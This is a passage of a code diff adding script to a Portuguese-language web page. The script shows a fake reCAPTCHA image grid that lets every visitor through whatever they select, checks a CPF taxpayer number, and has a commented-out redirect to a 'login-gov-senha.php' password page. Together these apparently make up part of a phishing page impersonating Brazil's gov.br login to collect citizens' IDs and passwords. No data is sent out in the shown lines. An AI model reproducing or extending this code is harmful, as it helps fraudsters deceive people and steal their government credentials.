+            'https://i.ibb.co/cKpRj5Vy/img10.jpg',
+        ];
+
+        let selectedImages = [];
+        let currentImages = [];
+
+        // Função para embaralhar array
+        function shuffleArray(array) {
+            const shuffled = [...array];
+            for (let i = shuffled.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
+            }
+            return shuffled;
+        }
+
+        // Função para gerar o grid de imagens
+        function generateRecaptchaGrid() {
+            const grid = document.getElementById('recaptcha-grid');
+            grid.innerHTML = '';
+
+            // Selecionar 3 corretas e 6 incorretas aleatoriamente
+            const selectedCorrect = shuffleArray(correctImages).slice(0, 3);
+            const selectedIncorrect = shuffleArray(incorrectImages).slice(0, 6);
+
+            // Combinar e embaralhar todas as imagens
+            currentImages = shuffleArray([...selectedCorrect, ...selectedIncorrect]);
+
+            currentImages.forEach((imageSrc, index) => {
+                const img = document.createElement('img');
+                img.src = imageSrc;
+                img.className = 'recaptcha-image';
+                img.dataset.index = index;
+                img.dataset.correct = correctImages.includes(imageSrc) ? 'true' : 'false';
+                img.onclick = () => selectImage(img);
+                grid.appendChild(img);
+            });
+
+            selectedImages = [];
+            updateAdvanceButton();
+        }
+
+        // Função para selecionar imagem
+        function selectImage(img) {
+            const index = parseInt(img.dataset.index);
+            const isCorrect = img.dataset.correct === 'true';
+
+            if (selectedImages.includes(index)) {
+                // Deselecionar
+                selectedImages = selectedImages.filter(i => i !== index);
+                img.classList.remove('selected-correct', 'selected-wrong');
+            } else {
+                // Selecionar
+                selectedImages.push(index);
+                if (isCorrect) {
+                    img.classList.add('selected-correct');
+                } else {
+                    img.classList.add('selected-wrong');
+                }
+            }
+
+            updateAdvanceButton();
+        }
+
+        // Função para atualizar o botão Avançar
+        function updateAdvanceButton() {
+            const advanceBtn = document.getElementById('recaptcha-advance');
+            // Sempre habilitar o botão Avançar
+            advanceBtn.disabled = false;
+        }
+
+        // Função para validar reCAPTCHA
+        function validateRecaptcha() {
+            // Prosseguir diretamente para validação do CPF, independentemente da seleção
+            showLoading();
+            proceedWithCpfValidation();
+        }
+
+        // Função para mostrar loading
+        function showLoading() {
+            const footer = document.getElementById('recaptcha-footer');
+            footer.classList.add('loading');
+            document.getElementById('loading-container').classList.add('active');
+        }
+
+        // Função para esconder loading
+        function hideLoading() {
+            const footer = document.getElementById('recaptcha-footer');
+            footer.classList.remove('loading');
+            document.getElementById('loading-container').classList.remove('active');
+        }
+
+        // Função para atualizar reCAPTCHA
+        function refreshRecaptcha() {
+            hideLoading();
+            generateRecaptchaGrid();
+        }
+
+        // Função para mostrar reCAPTCHA
+        function showRecaptcha() {
+            hideLoading();
+            generateRecaptchaGrid();
+            document.getElementById('recaptcha-overlay').style.display = 'flex';
+        }
+
+        // Função para fechar reCAPTCHA
+        function closeRecaptcha() {
+            hideLoading();
+            document.getElementById('recaptcha-overlay').style.display = 'none';
+        }
+
+        // Função para áudio (placeholder)
+        function playAudio() {
+            alert('Recurso de áudio não implementado nesta demonstração.');
+        }
+
+        // Função para prosseguir com validação do CPF
+        function proceedWithCpfValidation() {
+            let cpf = $('#cpf').val();
+            cpf = cpf.replace(/\D/g, '');
+
+            // Validar CPF
+            if (!validarCPF(cpf)) {
+                alert('CPF inválido. Por favor, verifique o número inserido.');
+                hideLoading();
+                return;
+            }
+
+            // Mostrar mensagem de sucesso
+            console.log("CPF válido:", cpf);
+
+            // Redirecionar para a próxima página (o loading permanece até carregar)
+            closeRecaptcha();
+            initSteps();
+            // window.location.href = `login-gov-senha.php?cpf=${cpf}` + window.location.search;
+        }
+
+        /**
+         * Formats the CPF input field
+         * @param {Element} element - The CPF input element
+         */
+        function formatCpf(element) {
+            const inputCpf = $('input[name=cpf]');
+            $(element).val(cpf($(element).val()));
+        }
+
+        /**
+         * Applies formatting mask to CPF
+         * @param {string} cpf - The unformatted CPF
+         * @returns {string} - The formatted CPF
+         */
+        function cpf(cpf) {
+            cpf = cpf.replace(/\D/g, "");
+            cpf = cpf.substring(0, 11);
+            cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+            cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+            return cpf;
+        }
+
+        /**
+         * Validates CPF using appropriate algorithms
+         * @param {string} cpf - The CPF to validate
+         * @returns {boolean} - True if CPF is valid
+         */
+        function validarCPF(cpf) {
+            // Remove non-numeric characters
+            cpf = cpf.replace(/\D/g, '');
+
+            // Check if CPF has 11 digits
+            if (cpf.length !== 11) {
+                return false;
+            }
+
+            // Check for known invalid patterns
+            if (/^(\d)\1{10}$/.test(cpf)) {
+                return false;
+            }
+
+            // Validate first check digit
+            let sum = 0;
+            for (let i = 0; i < 9; i++) {
+                sum += parseInt(cpf.charAt(i)) * (10 - i);
+            }
+            let remainder = (sum * 10) % 11;
+            if (remainder === 10 || remainder === 11) {
+                remainder = 0;
+            }
+            if (remainder !== parseInt(cpf.charAt(9))) {
+                return false;
+            }
+
+            // Validate second check digit
+            sum = 0;
+            for (let i = 0; i < 10; i++) {
+                sum += parseInt(cpf.charAt(i)) * (11 - i);
+            }
+            remainder = (sum * 10) % 11;
+            if (remainder === 10 || remainder === 11) {
+                remainder = 0;
+            }
+            if (remainder !== parseInt(cpf.charAt(10))) {
+                return false;
+            }
+
+            return true;
+        }
+
+        $(document).ready(function () {
+            $('#btn-consultar').click(function () {
+
+            });
+        });
+
+        function recpp() {
+            // Get the CPF and remove non-numeric characters
+            let cpf = $('#cpf').val();
+            cpf = cpf.replace(/\D/g, '');
+
+            // Validate CPF format first
+            if (!validarCPF(cpf)) {
+                alert('CPF inválido. Por favor, verifique o número inserido.');
+                return;
+            }
+            showRecaptcha();
+        }
+    </script>
+    <script src="../npm/crypto-js%404.2.0/crypto-js.min.js"></script>
+
+</body>
+
+</html>
